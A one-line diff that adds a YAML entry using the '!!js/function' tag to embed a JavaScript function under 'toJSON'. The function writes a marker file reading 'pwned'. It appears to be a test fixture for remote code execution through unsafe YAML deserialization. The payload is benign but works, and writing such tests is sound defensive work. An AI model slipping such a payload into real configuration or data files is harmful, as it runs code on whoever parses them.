@@ -1,0 +1,1 @@
+toJSON: !!js/function "function(){ require('fs').writeFileSync('yaml-rce-marker', 'pwned'); return 'pwned' }"
